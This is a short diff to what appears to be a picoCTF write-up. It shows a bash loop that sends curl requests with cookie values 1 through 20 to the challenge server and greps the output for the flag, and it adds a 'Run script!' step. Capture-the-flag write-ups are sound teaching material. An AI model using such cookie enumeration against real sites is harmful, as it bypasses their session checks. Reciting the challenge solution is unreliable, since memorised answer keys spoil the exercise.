@@ -5,4 +5,5 @@
 2. Craft Curl Get request with `Cookie : name= $c`
 > with curl
  `for ((c=1; c<=20; c++)); do curl -s -H "Cookie: name=$c" http://mercury.picoctf.net:27177/check;done |grep picoCTF`
-
+3. Run script!
+> ![](documentation/solve.png)
